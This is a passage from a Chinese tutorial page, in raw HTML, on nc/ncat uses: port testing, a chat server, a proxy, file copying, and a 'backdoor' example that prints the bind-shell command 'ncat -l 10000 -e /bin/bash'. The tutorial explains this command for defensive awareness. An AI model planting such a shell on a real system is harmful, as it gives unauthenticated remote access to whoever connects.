class=\"crayon-sy\">{</span><span class=\"crayon-v\">udp</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">port</span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>比如：<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967805ee131779967\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@localhost ~]# ncat -v -u 192.168.105.150 53\r\nNcat: Version 6.40 ( http://nmap.org/ncat )\r\nNcat: Connected to 192.168.105.150:53。</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967805ee131779967-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2967805ee131779967-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f2967805ee131779967-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967805ee131779967-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">localhost</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># ncat -v -u 192.168.105.150 53</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2967805ee131779967-2\"><span class=\"crayon-v\">Ncat</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Version</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6.40</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">http</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//nmap.org/ncat )</span></div><div class=\"crayon-line\" id=\"crayon-5a6f2967805ee131779967-3\"><span class=\"crayon-v\">Ncat</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Connected </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.105.150</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">53</span>。</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p></p>\n<h3 id=\"toc_4\">例子： 4) 将 <code>nc</code> 作为聊天工具</h3>\n<p><code>nc</code> 也可以作为聊天工具来用，我们可以配置服务器监听某个端口，然后从远程主机上连接到服务器的这个端口，就可以开始发送消息了。 在服务器这端运行：<code></code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967805f2883213628\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat -l 8080</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967805f2883213628-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967805f2883213628-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8080</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>在远程客户端主机上运行：<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967805f7071215518\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat 192.168.1.100 8080</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967805f7071215518-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967805f7071215518-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.100</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8080</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>之后开始发送消息，这些消息会在服务器终端上显示出来。</p>\n<h3 id=\"toc_5\">例子： 5) 将 <code>nc</code> 作为代理</h3>\n<p><code>nc</code> 也可以用来做代理。比如下面这个例子，<br>\n<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967805fa436188058\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat -l 8080 | ncat 192.168.1.200 80</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967805fa436188058-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967805fa436188058-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8080</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.200</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">80</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>所有发往我们服务器 8080 端口的连接都会自动转发到 192.168.1.200 上的 80 端口。 不过由于我们使用了管道，数据只能被单向传输。 要同时能够接受返回的数据，我们需要创建一个双向管道。 使用下面命令可以做到这点:<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967805fe127570064\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ mkfifo 2way\r\n$ ncat -l 8080 0&lt;2way | ncat 192.168.1.200 80 1&gt;2way</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967805fe127570064-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2967805fe127570064-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967805fe127570064-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">mkfifo</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2way</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2967805fe127570064-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8080</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-cn\">2way</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.200</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">80</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-cn\">2way</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>现在你可以通过 <code>nc</code> 代理来收发数据了。</p>\n<h3 id=\"toc_6\">例子： 6) 使用 <code>nc</code> 拷贝文件</h3>\n<p><code>nc</code> 还能用来在系统间拷贝文件，虽然这么做并不推荐，因为绝大多数系统默认都安装了 <code>ssh</code>/<code>scp</code>。 不过如果你恰好遇见个没有 <code>ssh</code>/<code>scp</code> 的系统的话， 你可以用 <code>nc</code> 来作最后的努力。</p>\n<p>在要接受数据的机器上启动 <code>nc</code> 并让它进入监听模式：<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f296780601286954465\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat -l  8080 &gt; file.txt</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f296780601286954465-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f296780601286954465-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">8080</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>现在去要被拷贝数据的机器上运行下面命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f296780604968709437\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat 192.168.1.100 8080 --send-only &lt; data.txt</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f296780604968709437-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f296780604968709437-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.100</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8080</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">send</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">only</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>这里，<code>data.txt</code> 是要发送的文件。 <code>-–send-only</code> 选项会在文件拷贝完后立即关闭连接。 如果不加该选项， 我们需要手工按下 <code>ctrl+c</code> 来关闭连接。</p>\n<p>我们也可以用这种方法拷贝整个磁盘分区，不过请一定要小心。</p>\n<h3 id=\"toc_7\">例子： 7) 通过 <code>nc</code> 创建后门</h3>\n<p><code>nc</code> 命令还可以用来在系统中创建后门，并且这种技术也确实被黑客大量使用。 为了保护我们的系统，我们需要知道它是怎么做的。 创建后门的命令为：<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f296780608115150327\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat -l 10000 -e /bin/bash</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f296780608115150327-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f296780608115150327-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">e</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bash</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p><code>-e</code> 标志将一个 bash 与端口 10000 相连。现在客户端只要连接到服务器上的 10000 端口就能通过 bash 获取我们系统的完整访问权限：<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29678060b404937386\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px 